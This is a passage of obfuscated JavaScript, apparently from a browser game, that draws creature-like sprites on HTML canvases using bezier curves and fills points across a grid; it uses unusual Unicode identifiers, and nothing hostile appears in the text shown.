			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[ᐃⲆᐃⵠⵠ], "f", ΔⲆΔΔΔ, ⲆΔΔⵠ, ⲆⲆΔᐃ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[20], "f", 3, 1, 1);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[21], "f", ⲆⵠΔⵠ, 0, ΔⲆⵠⲆ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[22], ⵠ[297], 2, 2, 2);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[22], ⵠ[297], 3, 1, 1);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[22], ⵠ[297], 4, ⵠⲆⲆ, Δⵠᐃ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[23], ⵠ[70], 3, 1, ⵠⲆΔ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[23], ⵠ[70], ⲆⵠΔⵠ, 0, ΔⲆⲆ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[23], ⵠ[70], ⵠΔⲆᐃ, ΔⵠⵠΔ, 2);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[23], "d", 3, ᐃᐃⲆΔ, 1);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[23], "d", 4, 0, 0);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[23], "d", Δⵠⵠⵠ, ΔⵠⵠΔ, ᐃⲆⵠᐃ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[24], "a", Ⲇⵠⵠᐃ, ⲆⵠΔΔ, 2);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[24], "a", ΔΔⵠΔ, 1, ⵠΔⲆ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[24], "a", 4, ⲆⲆⲆᐃ, Δᐃᐃᐃ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[30], "l", 4, ⵠⵠⵠΔ, ⲆΔΔⵠ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[30], "l", ⲆⲆⲆΔ, 1, 1);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[30], "l", ⵠⵠΔᐃΔ, 0, 0);
			ⵠᐃᐃ(Δ, 0, Ⲇᐃⵠⵠ, 0);
			Δ.globalCompositeOperation = ⵠ[172];
			Δ.translate(-9 * ᐃ, ᐃ * -ⵠΔᐃΔ);
			Δ.rect(ᐃ * ⵠᐃΔⵠ, ⲆⲆⲆᐃ, ᐃ * Ⲇⵠ.width, Ⲇⵠ.height * ᐃ, 10 * ᐃ);
			Δ.lineWidth = ᐃ * ⵠᐃⵠᐃΔΔΔ;
			Δ.strokeStyle = Ⲇᐃ[16];
			Δ.stroke();
			return Ⲇⵠ
		}

		function ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ, ΔᐃⲆ, ⲆⲆⵠ, ᐃᐃᐃᐃ, ⵠᐃΔᐃ) {
			if (ⵠᐃΔᐃ === ⲆΔⵠⲆⵠ) ⵠᐃΔᐃ = 0;
			for (var ⵠᐃⲆⲆ = ᐃᐃᐃᐃ == -1 ? ⵠⲆⲆ : ᐃᐃᐃᐃ; ⵠᐃΔᐃ <= ⵠᐃⲆⲆ; ⵠᐃⲆⲆ--) {
				for (var ⵠᐃ = 0; 200 > ⵠᐃ; ⵠᐃ++) {
					for (var ᐃⵠᐃⵠ = ⵠⲆᐃⵠ; 200 > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
						var ⵠᐃᐃᐃ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ᐃⵠᐃⵠ][ⵠᐃ];
						if (!ⵠᐃᐃᐃ || !ⵠᐃᐃᐃ[ΔᐃⲆ]) continue;
						if (ᐃᐃᐃᐃ == -1) var ᐃⲆΔ = ⵠᐃᐃᐃ[ΔᐃⲆ];
						else var ᐃⲆΔ = ⵠᐃᐃᐃ[ΔᐃⲆ][ⵠᐃⲆⲆ];
						for (var ⲆⲆⵠΔ = 0; ᐃⲆΔ && ⲆⲆⵠΔ < ᐃⲆΔ.length; ⲆⲆⵠΔ++) {
							var ⲆⵠⵠΔΔ = ᐃⲆΔ[ⲆⲆⵠΔ];
							Δ.fillStyle = Ⲇᐃ;
							ⵠᐃᐃ(Δ, .0095 * (ᐃ * ⲆⵠⵠΔΔ.x), ᐃ * ⲆⵠⵠΔΔ.y * .0095, ⲆⲆⵠ * ᐃ);
							Δ.fill()
						}
					}
				}
			}
		}
		const ⲆⵠⵠᐃⲆⲆΔ = ⵠᐃⵠΔᐃ;

		function ΔⲆⵠΔᐃᐃⵠⵠⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 188 * ᐃ;
			Ⲇⵠ.height = ᐃ * 190;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(33.00567626953125 * ᐃ, ᐃ * 95.44320678710938);
			Δ.bezierCurveTo(42.00567626953125 * ᐃ, ᐃ * 87.44320678710938, 48.00567626953125 * ᐃ, 51.443206787109375 * ᐃ, 74.00567626953125 * ᐃ, 47.443206787109375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 100.00567626953125, 42.443206787109375 * ᐃ, 118.00567626953125 * ᐃ, ᐃ * 49.443206787109375, 131.00567626953125 * ᐃ, ᐃ * 55.443206787109375);
			Δ.bezierCurveTo(140.00567626953125 * ᐃ, 70.44320678710938 * ᐃ, ᐃ * 145.00567626953125, ᐃ * 87.44320678710938, 152.00567626953125 * ᐃ, 94.44320678710938 * ᐃ);
			Δ.bezierCurveTo(149.00567626953125 * ᐃ, 99.44320678710938 * ᐃ, ᐃ * 147.00567626953125, 98.44320678710938 * ᐃ, ᐃ * 141.00567626953125, 101.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 147.00567626953125, 108.44320678710938 * ᐃ, ᐃ * 147.00567626953125, ᐃ * 111.44320678710938, ᐃ * 147.00567626953125, 112.44320678710938 * ᐃ);
			Δ.bezierCurveTo(143.00567626953125 * ᐃ, 112.44320678710938 * ᐃ, ᐃ * 141.00567626953125, 112.44320678710938 * ᐃ, ᐃ * 137.00567626953125, 111.44320678710938 * ᐃ);
			Δ.bezierCurveTo(138.00567626953125 * ᐃ, 117.44320678710938 * ᐃ, 138.00567626953125 * ᐃ, ᐃ * 120.44320678710938, 138.00567626953125 * ᐃ, 124.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 125.00567626953125, 107.44320678710938 * ᐃ, ᐃ * 121.00567626953125, 124.44320678710938 * ᐃ, 110.00567626953125 * ᐃ, 141.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102.00567626953125, ᐃ * 158.44320678710938, 89.00567626953125 * ᐃ, 158.44320678710938 * ᐃ, 80.00567626953125 * ᐃ, 144.44320678710938 * ᐃ);
			Δ.bezierCurveTo(61.00567626953125 * ᐃ, ᐃ * 111.44320678710938, ᐃ * 56.00567626953125, ᐃ * 117.44320678710938, 48.00567626953125 * ᐃ, ᐃ * 120.44320678710938);
			Δ.bezierCurveTo(ᐃ * 46.00567626953125, ᐃ * 118.44320678710938, 47.00567626953125 * ᐃ, ᐃ * 112.44320678710938, 48.00567626953125 * ᐃ, 107.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 43.00567626953125, 111.44320678710938 * ᐃ, ᐃ * 40.00567626953125, 111.44320678710938 * ᐃ, 37.00567626953125 * ᐃ, ᐃ * 110.44320678710938);
			Δ.bezierCurveTo(39.50567626953125 * ᐃ, ᐃ * 104.94320678710938, ᐃ * 39.50567626953125, 104.94320678710938 * ᐃ, ᐃ * 42.00567626953125, 99.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 33.00567626953125, ᐃ * 99.44320678710938, 33.00567626953125 * ᐃ, ᐃ * 98.44320678710938, 33.00567626953125 * ᐃ, ᐃ * 96.44320678710938);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[Δⵠᐃ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(51.00567626953125 * ᐃ, ᐃ * 72.53409576416016);
			Δ.bezierCurveTo(48.00567626953125 * ᐃ, ᐃ * 56.534095764160156, ᐃ * 48.00567626953125, ᐃ * 49.534095764160156, 54.00567626953125 * ᐃ, 35.534095764160156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 58.00567626953125, 26.534095764160156 * ᐃ, ᐃ * 65.00567626953125, ᐃ * 27.534095764160156, ᐃ * 73.00567626953125, ᐃ * 40.534095764160156);
			Δ.bezierCurveTo(ᐃ * 81.00567626953125, 49.534095764160156 * ᐃ, ᐃ * 82.00567626953125, 50.534095764160156 * ᐃ, 83.00567626953125 * ᐃ, ᐃ * 51.534095764160156);
			Δ.bezierCurveTo(77.00567626953125 * ᐃ, 71.53409576416016 * ᐃ, ᐃ * 64.00567626953125, 75.53409576416016 * ᐃ, 51.00567626953125 * ᐃ, 72.53409576416016 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 105.00567626953125, ᐃ * 50.53410339355469);
			Δ.bezierCurveTo(ᐃ * 112.00567626953125, 48.53410339355469 * ᐃ, ᐃ * 125.00567626953125, ᐃ * 21.534103393554688, 132.00567626953125 * ᐃ, ᐃ * 33.53410339355469);
			Δ.bezierCurveTo(ᐃ * 138.00567626953125, ᐃ * 42.53410339355469, ᐃ * 140.00567626953125, ᐃ * 64.53410339355469, ᐃ * 136.00567626953125, 75.53410339355469 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * Ⲇᐃᐃⵠ);
			return Ⲇⵠ
		}

		function ⲆᐃⲆⲆᐃᐃᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 85;
			var ⵠⵠᐃ = 115 * ᐃ;
			var ᐃⵠΔⲆ = ΔᐃⲆᐃ * ᐃ;
			var ⵠⲆⵠ = ᐃ * 4;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(-130 * ᐃ, -60 * ᐃ + ᐃⵠΔⲆ);
			Δ.globalAlpha = .5;
			Δ.beginPath();
			Δ.bezierCurveTo(190 * ᐃ, 87 * ᐃ, 201 * ᐃ, 59 * ᐃ, ᐃ * 208, 64 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 213, 68 * ᐃ, ᐃ * 204, 93 * ᐃ, ᐃ * 195, ᐃ * 109);
			Δ.bezierCurveTo(195 * ᐃ, ᐃ * 109, ᐃ * 202, 124 * ᐃ, ᐃ * 191, 141 * ᐃ);
			Δ.bezierCurveTo(182 * ᐃ, 151 * ᐃ, ᐃ * 164, ᐃ * 155, 148 * ᐃ, 144 * ᐃ);
			Δ.bezierCurveTo(136 * ᐃ, ᐃ * 135, ᐃ * 138, 111 * ᐃ, ᐃ * 145, 104 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 140, ᐃ * 92, ᐃ * 131, 67 * ᐃ, ᐃ * 138, 63 * ᐃ);
			Δ.bezierCurveTo(145 * ᐃ, ᐃ * 61, 153 * ᐃ, ᐃ * 82, ᐃ * 155, 96 * ᐃ);
			Δ.bezierCurveTo(167 * ᐃ, 91 * ᐃ, 178 * ᐃ, ᐃ * 92, ᐃ * 187, 98 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.translate(0, -ᐃⵠΔⲆ);
			Δ.globalAlpha = ⵠΔΔ;
			Δ.beginPath();
			Δ.bezierCurveTo(ᐃ * 190, 87 * ᐃ, ᐃ * 201, 59 * ᐃ, ᐃ * 208, 64 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 213, 68 * ᐃ, ᐃ * 204, 93 * ᐃ, ᐃ * 195, 109 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 195, 109 * ᐃ, ᐃ * 202, ᐃ * 124, 191 * ᐃ, ᐃ * 141);
			Δ.bezierCurveTo(ᐃ * 182, ᐃ * 151, 164 * ᐃ, ᐃ * 155, 148 * ᐃ, ᐃ * 144);
			Δ.bezierCurveTo(136 * ᐃ, 135 * ᐃ, ᐃ * 138, 111 * ᐃ, ᐃ * 145, 104 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 140, ᐃ * 92, 131 * ᐃ, ᐃ * 67, 138 * ᐃ, ᐃ * 63);
			Δ.bezierCurveTo(ᐃ * 145, ᐃ * 61, ᐃ * 153, ᐃ * 82, 155 * ᐃ, ᐃ * 96);
			Δ.bezierCurveTo(ᐃ * 167, ᐃ * 91, 178 * ᐃ, ᐃ * 92, ᐃ * 187, 98 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⲆᐃᐃⲆ], ⵠⲆⵠᐃ);
			var ᐃⵠⵠⵠⲆΔΔ = 155 * ᐃ;
			var ᐃⲆΔᐃᐃⲆᐃ = ᐃ * 133;
			var ⲆΔΔⵠⲆⲆⵠ = 10 * ᐃ;
			var ⵠⵠᐃΔⲆΔⵠ = 3 * ᐃ;
			var ΔⲆⲆⵠⵠᐃⲆ = ᐃⵠⵠⵠⲆΔΔ + -3 * ᐃ;
			var ᐃⵠᐃΔΔΔⲆ = ᐃⲆΔᐃᐃⲆᐃ + -ⵠⲆᐃᐃ * ᐃ;
			Δ.save();
			Δ.translate(ᐃⵠⵠⵠⲆΔΔ, ᐃⲆΔᐃᐃⲆᐃ);
			Δ.globalAlpha = ⵠⲆΔ;
			ⵠᐃᐃ(Δ, 0, 0, ⲆΔΔⵠⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ]);
			Δ.restore();
			Δ.save();
			Δ.translate(ΔⲆⲆⵠⵠᐃⲆ, ᐃⵠᐃΔΔΔⲆ);
			Δ.globalAlpha = ⵠΔⲆ;
			ⵠᐃᐃ(Δ, ΔΔⵠⵠ, Ⲇᐃⵠⵠ, ⵠⵠᐃΔⲆΔⵠ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠⵠⲆΔΔ + ᐃ * 27, ᐃⲆΔᐃᐃⲆᐃ);
			Δ.globalAlpha = ᐃⲆᐃ;
			ⵠᐃᐃ(Δ, ΔⲆⲆ, ⲆΔⵠ, ⲆΔΔⵠⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃ * 27 + ΔⲆⲆⵠⵠᐃⲆ, ᐃⵠᐃΔΔΔⲆ);
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, 0, ⲆΔⵠ, ⵠⵠᐃΔⲆΔⵠ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			return Ⲇⵠ
		}

		function ⵠⲆΔΔⵠΔΔᐃⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 85 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 115;
			var ᐃⵠΔⲆ = 6 * ᐃ;
			var ⵠⲆⵠ = ᐃ * 4;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(-130 * ᐃ, -60 * ᐃ);
			Δ.globalAlpha = Ⲇᐃⵠ;
			Δ.beginPath();
			Δ.bezierCurveTo(ᐃ * 190, 87 * ᐃ, ᐃ * 201, ᐃ * 59, 208 * ᐃ, ᐃ * 64);
			Δ.bezierCurveTo(213 * ᐃ, 68 * ᐃ, ᐃ * 204, ᐃ * 93, ᐃ * 195, ᐃ * 109);
			Δ.bezierCurveTo(195 * ᐃ, ᐃ * 109, 202 * ᐃ, ᐃ * 124, 191 * ᐃ, ᐃ * 141);
			Δ.bezierCurveTo(182 * ᐃ, 151 * ᐃ, ᐃ * 164, 155 * ᐃ, ᐃ * 148, 144 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 136, ᐃ * 135, ᐃ * 138, 111 * ᐃ, ᐃ * 145, ᐃ * 104);
			Δ.bezierCurveTo(140 * ᐃ, 92 * ᐃ, 131 * ᐃ, 67 * ᐃ, 138 * ᐃ, ᐃ * 63);
			Δ.bezierCurveTo(145 * ᐃ, 61 * ᐃ, 153 * ᐃ, 82 * ᐃ, 155 * ᐃ, 96 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 167, 91 * ᐃ, 178 * ᐃ, ᐃ * 92, ᐃ * 187, ᐃ * 98);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ, Ⲇᐃ, ⵠⲆⵠ);
			return Ⲇⵠ
		}

		function ΔΔᐃⵠⲆⲆᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 188;
			Ⲇⵠ.height = 190 * ᐃ;
			Δ.globalAlpha = .5;
			Δ.translate(ᐃΔΔ, ΔⲆΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(33.00567626953125 * ᐃ, 95.44320678710938 * ᐃ);
			Δ.bezierCurveTo(42.00567626953125 * ᐃ, ᐃ * 87.44320678710938, ᐃ * 48.00567626953125, ᐃ * 51.443206787109375, 74.00567626953125 * ᐃ, 47.443206787109375 * ᐃ);
			Δ.bezierCurveTo(100.00567626953125 * ᐃ, 42.443206787109375 * ᐃ, ᐃ * 118.00567626953125, 49.443206787109375 * ᐃ, ᐃ * 131.00567626953125, ᐃ * 55.443206787109375);
			Δ.bezierCurveTo(ᐃ * 140.00567626953125, 70.44320678710938 * ᐃ, 145.00567626953125 * ᐃ, 87.44320678710938 * ᐃ, ᐃ * 152.00567626953125, ᐃ * 94.44320678710938);
			Δ.bezierCurveTo(149.00567626953125 * ᐃ, 99.44320678710938 * ᐃ, ᐃ * 147.00567626953125, ᐃ * 98.44320678710938, 141.00567626953125 * ᐃ, 101.44320678710938 * ᐃ);
			Δ.bezierCurveTo(147.00567626953125 * ᐃ, 108.44320678710938 * ᐃ, 147.00567626953125 * ᐃ, 111.44320678710938 * ᐃ, 147.00567626953125 * ᐃ, 112.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 143.00567626953125, ᐃ * 112.44320678710938, 141.00567626953125 * ᐃ, ᐃ * 112.44320678710938, 137.00567626953125 * ᐃ, 111.44320678710938 * ᐃ);
			Δ.bezierCurveTo(138.00567626953125 * ᐃ, ᐃ * 117.44320678710938, 138.00567626953125 * ᐃ, ᐃ * 120.44320678710938, ᐃ * 138.00567626953125, ᐃ * 124.44320678710938);
			Δ.bezierCurveTo(ᐃ * 125.00567626953125, ᐃ * 107.44320678710938, ᐃ * 121.00567626953125, 124.44320678710938 * ᐃ, 110.00567626953125 * ᐃ, 141.44320678710938 * ᐃ);
			Δ.bezierCurveTo(102.00567626953125 * ᐃ, ᐃ * 158.44320678710938, ᐃ * 89.00567626953125, 158.44320678710938 * ᐃ, 80.00567626953125 * ᐃ, ᐃ * 144.44320678710938);
			Δ.bezierCurveTo(ᐃ * 61.00567626953125, 111.44320678710938 * ᐃ, 56.00567626953125 * ᐃ, ᐃ * 117.44320678710938, 48.00567626953125 * ᐃ, ᐃ * 120.44320678710938);
			Δ.bezierCurveTo(46.00567626953125 * ᐃ, 118.44320678710938 * ᐃ, ᐃ * 47.00567626953125, 112.44320678710938 * ᐃ, 48.00567626953125 * ᐃ, ᐃ * 107.44320678710938);
			Δ.bezierCurveTo(43.00567626953125 * ᐃ, ᐃ * 111.44320678710938, 40.00567626953125 * ᐃ, ᐃ * 111.44320678710938, 37.00567626953125 * ᐃ, ᐃ * 110.44320678710938);
			Δ.bezierCurveTo(ᐃ * 39.50567626953125, 104.94320678710938 * ᐃ, 39.50567626953125 * ᐃ, 104.94320678710938 * ᐃ, ᐃ * 42.00567626953125, ᐃ * 99.44320678710938);
			Δ.bezierCurveTo(33.00567626953125 * ᐃ, 99.44320678710938 * ᐃ, 33.00567626953125 * ᐃ, 98.44320678710938 * ᐃ, 33.00567626953125 * ᐃ, 96.44320678710938 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ], Ⲇᐃ[0], ᐃ * ⵠᐃᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 60.00567626953125, ᐃ * 99.35227966308594);
			Δ.bezierCurveTo(70.00567626953125 * ᐃ, ᐃ * 82.35227966308594, 85.00567626953125 * ᐃ, ᐃ * 86.35227966308594, 87.00567626953125 * ᐃ, 97.35227966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 89.00567626953125, ᐃ * 101.35227966308594, ᐃ * 88.00567626953125, ᐃ * 105.35227966308594, 87.00567626953125 * ᐃ, 110.35227966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 89.00567626953125, ᐃ * 111.35227966308594, 91.00567626953125 * ᐃ, ᐃ * 112.35227966308594, ᐃ * 93.00567626953125, ᐃ * 115.35227966308594);
			Δ.bezierCurveTo(96.00567626953125 * ᐃ, ᐃ * 111.35227966308594, 99.00567626953125 * ᐃ, ᐃ * 111.35227966308594, ᐃ * 100.00567626953125, 110.35227966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 98.00567626953125, ᐃ * 92.35227966308594, ᐃ * 103.00567626953125, ᐃ * 86.35227966308594, 113.00567626953125 * ᐃ, ᐃ * 89.35227966308594);
			Δ.bezierCurveTo(ᐃ * 122.00567626953125, 92.35227966308594 * ᐃ, ᐃ * 123.00567626953125, 94.35227966308594 * ᐃ, ᐃ * 126.00567626953125, ᐃ * 98.35227966308594);
			Δ.bezierCurveTo(124.00567626953125 * ᐃ, ᐃ * 102.35227966308594, ᐃ * 123.00567626953125, 103.35227966308594 * ᐃ, ᐃ * 121.00567626953125, ᐃ * 104.35227966308594);
			Δ.bezierCurveTo(124.00567626953125 * ᐃ, 105.35227966308594 * ᐃ, 126.00567626953125 * ᐃ, 107.35227966308594 * ᐃ, 129.00567626953125 * ᐃ, ᐃ * 111.35227966308594);
			Δ.bezierCurveTo(115.00567626953125 * ᐃ, 122.35227966308594 * ᐃ, ᐃ * 113.00567626953125, 145.35227966308594 * ᐃ, 100.00567626953125 * ᐃ, ᐃ * 152.35227966308594);
			Δ.bezierCurveTo(ᐃ * 91.00567626953125, 158.35227966308594 * ᐃ, ᐃ * 83.00567626953125, 149.35227966308594 * ᐃ, 76.00567626953125 * ᐃ, 138.35227966308594 * ᐃ);
			Δ.bezierCurveTo(67.00567626953125 * ᐃ, ᐃ * 114.35227966308594, ᐃ * 63.00567626953125, ᐃ * 113.35227966308594, 59.00567626953125 * ᐃ, ᐃ * 111.35227966308594);
			Δ.bezierCurveTo(ᐃ * 62.00567626953125, 107.35227966308594 * ᐃ, 64.00567626953125 * ᐃ, 105.35227966308594 * ᐃ, 66.00567626953125 * ᐃ, 104.35227966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63.00567626953125, 100.35227966308594 * ᐃ, 62.00567626953125 * ᐃ, ᐃ * 100.35227966308594, 60.00567626953125 * ᐃ, 99.35227966308594 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[Δⵠᐃ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 51.00567626953125, 72.53409576416016 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 48.00567626953125, ᐃ * 56.534095764160156, 48.00567626953125 * ᐃ, 49.534095764160156 * ᐃ, 54.00567626953125 * ᐃ, 35.534095764160156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 58.00567626953125, ᐃ * 26.534095764160156, ᐃ * 65.00567626953125, 27.534095764160156 * ᐃ, ᐃ * 73.00567626953125, 40.534095764160156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 81.00567626953125, ᐃ * 49.534095764160156, 82.00567626953125 * ᐃ, ᐃ * 50.534095764160156, 83.00567626953125 * ᐃ, ᐃ * 51.534095764160156);
			Δ.bezierCurveTo(ᐃ * 77.00567626953125, ᐃ * 71.53409576416016, 64.00567626953125 * ᐃ, 75.53409576416016 * ᐃ, 51.00567626953125 * ᐃ, 72.53409576416016 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ], Ⲇᐃ[ᐃⵠΔ], ᐃ * Δⵠⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 105.00567626953125, 50.53410339355469 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 112.00567626953125, ᐃ * 48.53410339355469, 125.00567626953125 * ᐃ, ᐃ * 21.534103393554688, ᐃ * 132.00567626953125, 33.53410339355469 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 138.00567626953125, ᐃ * 42.53410339355469, 140.00567626953125 * ᐃ, ᐃ * 64.53410339355469, ᐃ * 136.00567626953125, ᐃ * 75.53410339355469);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⲆⲆⲆᐃ], ΔⲆΔΔΔ * ᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(ⲆⲆⲆᐃ, -5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 33.00567626953125, ᐃ * 95.44320678710938);
			Δ.bezierCurveTo(42.00567626953125 * ᐃ, 87.44320678710938 * ᐃ, 48.00567626953125 * ᐃ, 51.443206787109375 * ᐃ, 74.00567626953125 * ᐃ, ᐃ * 47.443206787109375);
			Δ.bezierCurveTo(100.00567626953125 * ᐃ, 42.443206787109375 * ᐃ, ᐃ * 118.00567626953125, ᐃ * 49.443206787109375, ᐃ * 131.00567626953125, ᐃ * 55.443206787109375);
			Δ.bezierCurveTo(ᐃ * 140.00567626953125, ᐃ * 70.44320678710938, 145.00567626953125 * ᐃ, 87.44320678710938 * ᐃ, 152.00567626953125 * ᐃ, 94.44320678710938 * ᐃ);
			Δ.bezierCurveTo(149.00567626953125 * ᐃ, 99.44320678710938 * ᐃ, ᐃ * 147.00567626953125, ᐃ * 98.44320678710938, 141.00567626953125 * ᐃ, 101.44320678710938 * ᐃ);
			Δ.bezierCurveTo(147.00567626953125 * ᐃ, ᐃ * 108.44320678710938, 147.00567626953125 * ᐃ, ᐃ * 111.44320678710938, 147.00567626953125 * ᐃ, 112.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 143.00567626953125, ᐃ * 112.44320678710938, ᐃ * 141.00567626953125, 112.44320678710938 * ᐃ, ᐃ * 137.00567626953125, 111.44320678710938 * ᐃ);
			Δ.bezierCurveTo(138.00567626953125 * ᐃ, ᐃ * 117.44320678710938, 138.00567626953125 * ᐃ, ᐃ * 120.44320678710938, 138.00567626953125 * ᐃ, ᐃ * 124.44320678710938);
			Δ.bezierCurveTo(125.00567626953125 * ᐃ, ᐃ * 107.44320678710938, ᐃ * 121.00567626953125, 124.44320678710938 * ᐃ, ᐃ * 110.00567626953125, 141.44320678710938 * ᐃ);
			Δ.bezierCurveTo(102.00567626953125 * ᐃ, 158.44320678710938 * ᐃ, ᐃ * 89.00567626953125, ᐃ * 158.44320678710938, 80.00567626953125 * ᐃ, 144.44320678710938 * ᐃ);
			Δ.bezierCurveTo(61.00567626953125 * ᐃ, ᐃ * 111.44320678710938, 56.00567626953125 * ᐃ, 117.44320678710938 * ᐃ, 48.00567626953125 * ᐃ, 120.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 46.00567626953125, ᐃ * 118.44320678710938, 47.00567626953125 * ᐃ, 112.44320678710938 * ᐃ, 48.00567626953125 * ᐃ, 107.44320678710938 * ᐃ);
